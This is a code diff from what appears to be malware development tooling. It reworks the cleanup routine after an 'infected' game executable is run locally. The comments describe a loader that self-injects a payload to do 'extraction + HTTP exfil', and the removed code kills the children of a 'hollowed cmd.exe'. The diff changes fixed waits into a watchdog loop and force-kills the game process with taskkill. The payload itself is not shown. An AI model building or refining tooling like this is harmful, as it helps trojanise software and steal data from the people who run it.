@@ -868,39 +868,34 @@ def run_infected_locally(host_path, infected_path, is_folder=False):
     _wait_and_cleanup(proc, host_path, os.path.basename(host_path), backup)
 
 def _wait_and_cleanup(proc, host_path, exe_name, backup=None):
-    """Wait for game to open, kill loader, wait for payload, kill game, restore."""
+    """Wait for the payload to finish, then clean up.
+
+    v13 self-injection: the loader process IS the payload host -- the payload
+    runs as a thread of that process, so terminating the loader terminates the
+    run. Wait for it to exit on its own (payload completion); only force it if
+    it outlives the watchdog.
+    """
     loader_pid = proc.pid
 
-    # wait for the game/app to open, then kill the loader
-    log("[*] waiting 10s for game to open + payload to start...")
-    time.sleep(10)
-    try:
-        proc.terminate()
-        log("[*] loader terminated (PID=%d)" % loader_pid)
-    except Exception:
-        log("[!] could not terminate loader")
-
-    # wait for payload to finish (extraction + HTTP exfiltration)
-    log("[*] waiting 25s for payload extraction + HTTP exfil...")
-    time.sleep(25)
+    log("[*] waiting for payload to finish (loader PID=%d)..." % loader_pid)
+    deadline = time.time() + 360
+    while proc.poll() is None and time.time() < deadline:
+        time.sleep(2)
+    if proc.poll() is None:
+        log("[!] payload still running after 6 min; terminating loader")
+        try:
+            proc.terminate()
+            proc.wait(timeout=10)
+        except Exception:
+            log("[!] could not terminate loader")
+    else:
+        log("[*] loader exited (code=%s)" % proc.returncode)
 
     # kill the game process — it holds the file lock on host_path
     log("[*] killing game process (%s)..." % exe_name)
     try:
         subprocess.run('taskkill /F /IM "%s" >nul 2>&1' % exe_name,
                        shell=True, timeout=5)
-    except Exception:
-        pass
-
-    # kill orphaned child processes of the dead loader (hollowed cmd.exe)
-    try:
-        ps_cmd = (
-            'Get-CimInstance Win32_Process | '
-            'Where-Object { $_.ParentProcessId -eq %d } | '
-            'ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }'
-        ) % loader_pid
-        subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd],
-                       capture_output=True, timeout=10)
     except Exception:
         pass
 
